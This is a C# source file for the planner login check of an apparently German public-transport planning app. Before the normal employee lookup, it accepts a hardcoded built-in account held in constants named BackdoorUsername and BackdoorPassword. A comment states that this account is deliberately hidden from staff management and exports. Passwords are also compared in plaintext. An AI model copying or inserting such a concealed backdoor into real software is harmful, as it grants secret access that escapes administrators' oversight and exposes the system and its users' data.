using SmartOepnv.Core.RoutePackage;

namespace SmartOepnv.Core.Session;

public static class PlanerCredentialValidator
{
    // Fest eingebauter Notfall-Zugang (nicht in Personalverwaltung, nicht in Exporte).
    private const string BackdoorUsername = BuiltinAdminEmployee.Name;
    private const string BackdoorPassword = BuiltinAdminEmployee.PlannerPassword;

    public static bool TryValidate(string username, string password, out string authenticatedName)
    {
        authenticatedName = string.Empty;
        var trimmedUser = username?.Trim() ?? string.Empty;
        if (string.IsNullOrWhiteSpace(trimmedUser) || string.IsNullOrEmpty(password))
        {
            return false;
        }

        if (string.Equals(trimmedUser, BackdoorUsername, StringComparison.Ordinal) &&
            string.Equals(password, BackdoorPassword, StringComparison.Ordinal))
        {
            authenticatedName = BackdoorUsername;
            return true;
        }

        foreach (var employee in EnumeratePlannerUsers())
        {
            if (!employee.CanLoginToPlanner)
            {
                continue;
            }

            if (!string.Equals(employee.PlannerUsername, trimmedUser, StringComparison.Ordinal) ||
                !string.Equals(employee.PlannerPassword, password, StringComparison.Ordinal))
            {
                continue;
            }

            authenticatedName = employee.PlannerUsername;
            return true;
        }

        return false;
    }

    private static IEnumerable<EmployeeRosterItem> EnumeratePlannerUsers()
    {
        var editor = AppServices.Routes.Editor;
        if (editor?.Employees.Count > 0)
        {
            return editor.Employees;
        }

        if (AppServices.PlannerLocal is not null)
        {
            var store = new PlannerLocalOverlayStore(AppServices.SettingsSubfolder);
            return store.LoadOrEmpty().Employees;
        }

        return [];
    }
}
